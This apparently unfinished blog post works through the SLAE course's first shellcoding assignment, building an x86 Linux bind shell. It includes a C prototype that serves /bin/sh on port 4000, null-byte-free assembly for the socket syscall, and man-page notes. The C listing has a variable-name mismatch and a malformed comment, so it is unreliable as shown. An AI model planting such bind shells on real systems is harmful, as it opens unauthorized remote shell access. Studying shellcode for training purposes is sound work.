---
title: SLAE exam assignment 01
author: Stipe Marinovic
date: 2020-05-17 20:00:00 +0800
categories: [Blogging, Tutorial]
tags: [slae, shellcoding]
toc: true
---
... page still under construction ...  

## Assignment 01 ##

* Create a Shell_Bind_TCP shellcode
  - Binds to a port
  - Execs Shell on incoming connection
* Port number should be easily configurable

## Prototype ##

To get idea how bind shell works and which syscalls are used/needed, we can create prototye of bind shell code in C.  

```
#define _GNU_SOURCE # added to avoid gcc's implicit declaration of function warning
#include <unistd.h> 
#include <stdio.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 

int main() { 

  // Define struct containing bind() arguments
  struct sockaddr_in server; 

  // Define socket file descriptor
  int socketfd; 
  int socketid; 
   
  // Create socket 
  socketd = socket(AF_INET, SOCK_STREAM, 6); 

  // Setup struct "server" containing following information: address, port and address family
  server.sin_addr.s_addr = htonl(INADDR_ANY); // any address (0.0.0.0)
  server.sin_port = htons(4000);              // port 4000
  server.sin_family = AF_INET;                // address family (ip v4)

  // Bind socket to ip 0.0.0.0, port 4000 
  bind(socketd, (struct sockaddr*) &server, sizeof(server)); 

  // Listen for incoming connections 
  listen(socketd, 2); 

  // Accept incoming connection 
  socketid = accept(socketd, NULL, NULL); 

  // Bind STDIN (0), STDOUT (1), STDERR (2) to incoming connection 
  dup2(socketid, 0); 
  dup2(socketid, 1); 
  dup2(socketid, 2); 

  // Run /bin/sh shell 
  execve("/bin/sh", NULL, NULL); 
} 
```

Once application is compiled (`with: gcc bind.c`) and run (`./a.out`), we can confirm with netstat (`netstat -antvp`) and netcat (`nc -v 127.0.0.1 4000`) 
that application is indeed listening at port 4000 and provides shell to whoever connects to listening port as shown on following screenshot.
![bind shell](https://smarinovic.github.io/assets/img/slae_00001.png)

## Syscalls ##

Based on prototype code above, we can conclude that following syscalls are needed to implement bind shell:

* socket
* bind
* listen
* accept
* dup2
* execve

List of all syscalls and their associated numbers can be found in: unistd_32.h. On Kali 2019.4 linux file is located on following location: 
```
/usr/include/x86_64-linux-gnu/asm/unistd_32.h
```
```
Syscall               Dec   Hex
----------------------------------
#define __NR_socket   359   0x167
#define __NR_bind     361   0x169
#define __NR_listen   363   0x16B
#define __NR_accept4  364   0x16C
#define __NR_dup2     63    0x3F
#define __NR_execve   11    0xB
```

Each syscall and its arguments are defined in man 2 pages in form of C function. In order to find out which argments are needed we need to look at man pages. 
Based on man 2 pages for socket syscall (`man 2 socket`) we can see the three arguments that need to be passed to syscall.

```
int socket(int domain, int type, int protocol);
```
socket()  creates an endpoint for communication and returns a file descriptor that refers to that endpoint.  
The domain argument specifies a communication domain; this selects the protocol family which will be used for communication.  These families are defined in <sys/socket.h>.  
The socket has the indicated type, which specifies the communication semantics.  
The protocol specifies a particular protocol to be used with the socket.  Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case protocol can be specified as 0.
  
Arguments are passed via registers in following order; EAX, EBX, ECX, EDX, ESI, EDI. EAX always contains syscall number (in case of socket it is decimal 359 or hex 0x167). 
The domain, type and protocol needs to be passed in EBX, ECX and EDX registers.
  
Assemlby instraction: `MOV EAX, value` is used to move value to EAX register. Since shell code will most probably be used within exploit, payload cannot contain null byte as null byte (\x00) terminates string and break exploit. Playing with msf-nasm_shell.rb script which is available in Kali linux we can see that opcode for MOV EAX, 0x167 contains null bytes.
```
nasm > mov eax, 0x167
00000000  B867010000        mov eax, 0x167
Null Bytes -----^^^^
```
To mitigate this issue, we need to find another way of placing 0x167 in EAX register. One way is to do this is to clear EAX register (set it to zero) and once EAX register is set to zero use MOV AX, 0x167 which refers to first 16 bit of EAX register. Opcode for such instruction does not contain null bytes as shown on following example:
```
nasm > mov ax, 0x167
00000000  66B86701          mov ax, 0x167
nasm > 
```

Once syscall number is placed in EAX register, we can continue with function arguments. If we look at prototype code: 
```
socket(AF_INET, SOCK_STREAM, 6);
``` 
We can see that 
* domain is set to AF_INET which is eaqual to "2"
* type is set to SOCK_STREAM which is eaqual to "1" and
* protocol is set to 6 (IPPROTO_TCP)

Since values 1, 2 and 6 would generate null bytes as shown on following block code: 
```
nasm > mov EBX, 0x2
00000000  BB02000000        mov ebx,0x2 
Null bytes ---^^^^^^
                                                                                      
nasm > mov ECX, 0x1
00000000  B901000000        mov ecx,0x1                                                                       
Null bytes ---^^^^^^

nasm > mov EDX, 0x6
00000000  BA06000000        mov edx,0x6 
Null bytes ---^^^^^^
```

similar to moving value to EAX register, we can move values to BL, CL and DL wich represents first 8 bites of EBX, ECX and EDX registers. We couldn't use MOV AL, 0x167 as 0x167 requires more than 8 bits so AX had to be used.

```
nasm > mov bl, 0x2
00000000  B302              mov bl,0x2
nasm > mov cl, 0x1
00000000  B101              mov cl,0x1
nasm > mov dl, 0x6
00000000  B206              mov dl,0x6
```

Before we can move any value to register we need to se registers to zero. The easiest way to do it without null bytes is to preform XOR operation on register.

```
; Clearing registers
XOR EAX, EAX    ; set EAX to zero
XOR EBX, EBX    ; set EBX to zero
XOR ECX, ECX    ; set ECX to zero
XOR EDX, EDX    ; set EDX to zero
```

When registers are set to zero we can start writing assembly code to call socket syscall:

```
MOV AX, 0x167  ; 0x167 is hex syscall to socket
MOV BL, 2      ; set domain argument
MOV CL, 1      ; set type argument
MOV DL, 6      ; set protocol argument
INT 0x80       ; preforming syscall

```

.... to be continued ...


```
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
// When a socket is created with socket(2), it exists in a name space (address family) but has no address assigned to it.
// bind() assigns the address specified by addr to the socket referred to by the file descriptor sockfd.  
// addrlen specifies the size, in bytes, of the address structure pointed to by addr.
```

```
int listen(int sockfd, int backlog);
// listen() marks the socket referred to by sockfd as a passive socket, that is, as a socket that will be used to accept incoming connection requests using accept(2).
// The sockfd argument is a file descriptor that refers to a socket of type SOCK_STREAM or SOCK_SEQPACKET.
//  The backlog argument defines the maximum length to which the queue of pending connections for sockfd may grow.  
```

```
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
// The accept() system call is used with connection-based socket types (SOCK_STREAM, SOCK_SEQPACKET). 
// It extracts the first connection request on the queue of pending connections for the listening socket, sockfd, creates a new connected socket, and returns a new file descriptor referring to that socket.  
// The newly created socket is not in the listening state.  
```

```
int dup2(int oldfd, int newfd);
// The dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor, it uses the file descriptor number specified in newfd.  If the file descriptor newfd was previously open, it is silently closed before being reused.
```

```
int execve(const char *pathname, char *const argv[], char *const envp[]);
// execve()  executes the program referred to by pathname.  
// This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and (initialized and uninitialized) data segments.
// pathname must be either a binary executable, or a script starting with a line of the form:
// #!interpreter [optional-arg]
```

